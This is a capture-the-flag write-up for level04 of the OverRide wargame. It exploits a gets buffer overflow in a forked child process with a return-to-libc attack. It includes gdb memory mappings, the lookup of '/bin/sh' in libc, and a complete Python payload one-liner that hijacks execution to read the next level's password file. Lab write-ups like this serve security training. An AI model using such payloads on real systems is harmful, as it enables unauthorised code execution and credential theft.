## Brief

This program spwan a child process in which the `gets` function is called in a buffer. The main process use the ptrace function in order to check that we don't use `execve` syscall.

## Exploit

We will use a classic buffer overflow to rewrite the return address of the main function in the child process but we won't inject a shellcode.

We're using a return to libc attack, so we get the address of the `system` function.

So now we will rewrite the return address with the address of the `system` function, using the pattern generator we see that the offset is 156.

We then need to set the parameters of `system` we want to execute `/bin/bash` so we just need to the string in the libc and put the address as a parameter. To do so we use the command `string`.

```bash
(gdb) info proc mapping
process 1927
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	...
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
    ...
```

```bash
level04@OverRide:~$ strings -a -t x /lib32/libc-2.15.so | grep "/bin/sh"
15d7ec /bin/sh
```

Adding the offset with the base we get the address `0xf7f897ec`. We need to offset this address by 4 bytes to skip the old `eip` of the `system` function.

## Commands

```bash
(python -c "print('\x90'*156 + '\xd0\xae\xe6\xf7' + '\x00'*4 + '\xec\x97\xf8\xf7')"; echo "cat /home/users/level05/.pass") | ./level04
```